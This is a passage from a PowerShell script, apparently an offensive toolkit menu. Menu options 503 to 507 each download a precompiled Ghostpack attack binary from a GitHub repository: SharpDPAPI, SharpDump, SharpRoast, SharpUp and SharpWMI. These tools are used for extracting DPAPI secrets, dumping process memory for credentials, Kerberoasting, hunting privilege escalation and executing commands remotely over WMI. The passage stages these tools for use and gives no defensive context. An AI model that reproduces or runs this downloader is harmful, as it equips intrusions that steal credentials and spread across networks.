        '503' {ScaricaSSL "r3motecontrol/Ghostpack-CompiledBinaries/SharpDPAPI" "SharpDPAPI.exe" "r3motecontrol/Ghostpack-CompiledBinaries/raw/master/SharpDPAPI.exe"}
        '504' {ScaricaSSL "r3motecontrol/Ghostpack-CompiledBinaries/SharpDump" "SharpDump.exe" "r3motecontrol/Ghostpack-CompiledBinaries/raw/master/SharpDump.exe"}
        '505' {ScaricaSSL "r3motecontrol/Ghostpack-CompiledBinaries/SharpRoast" "SharpRoast.exe" "r3motecontrol/Ghostpack-CompiledBinaries/raw/master/SharpRoast.exe"}
        '506' {ScaricaSSL "r3motecontrol/Ghostpack-CompiledBinaries/SharpUp" "SharpUp.exe" "r3motecontrol/Ghostpack-CompiledBinaries/raw/master/SharpUp.exe"}
        '507' {ScaricaSSL "r3motecontrol/Ghostpack-CompiledBinaries/SharpWMI" "SharpWMI.exe" "r3motecontrol/Ghostpack-CompiledBinaries/raw/master/SharpWMI.exe"}
        default{write-host 'ERROR: this choice is incorrect'}
    }
    read-host "Press ENTER to continue";
}
